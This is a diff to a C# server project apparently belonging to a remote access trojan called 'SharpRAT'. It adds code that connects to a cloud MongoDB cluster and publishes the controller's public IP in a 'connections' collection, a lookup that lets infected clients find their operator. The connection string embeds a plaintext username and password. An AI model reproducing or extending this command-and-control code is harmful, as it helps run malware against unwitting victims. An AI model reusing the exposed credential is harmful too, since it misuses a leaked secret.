@@ -1,4 +1,10 @@
 using Server.Server;
+using MongoDB.Bson;
+using MongoDB.Bson.Serialization.Attributes;
+using MongoDB.Driver;
+using System;
+using System.Net;
+using System.Net.Sockets;
 
 namespace Server
 {
@@ -16,7 +22,49 @@ namespace Server
             uiRequests = new RequestUI();
             imageList = new ImageList();
             InitializeComponent();
+            MongoInit();
         }
+        public string ipget()
+        {
+            WebClient webClient = new WebClient();
+            string publicIp = webClient.DownloadString("https://api.ipify.org");
+            Console.WriteLine("My public IP Address is: {0}", publicIp);
+            return publicIp;
+
+        }
+        
+        private void MongoInit()
+        {
+            var client = new MongoClient(
+            "mongodb+srv://Snutri:tCbJtoBWdEHCOEjS@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
+            // Create the collection object that represents the "products" collection
+
+            var database = client.GetDatabase("SharpRAT");
+
+            var connections = database.GetCollection<BsonDocument>("connections");
+
+            // Clean up the collection if there is data in there
+
+            database.DropCollection("connections");
+
+            // collections can't be created inside a transaction so create it first
+
+            database.CreateCollection("connections");
+
+            // Create some sample data
+            var newest = new BsonDocument
+            { 
+                { "AdminName", "test" },
+                { "CurrentIp", ipget() }
+            };
+
+            // Insert the sample data 
+            connections.InsertOne(newest);
+            return;
+        
+        }
+            //var database = client.GetDatabase("test");
+        
         private void AddUserToViewlist(string text)
         {
             // Parse text
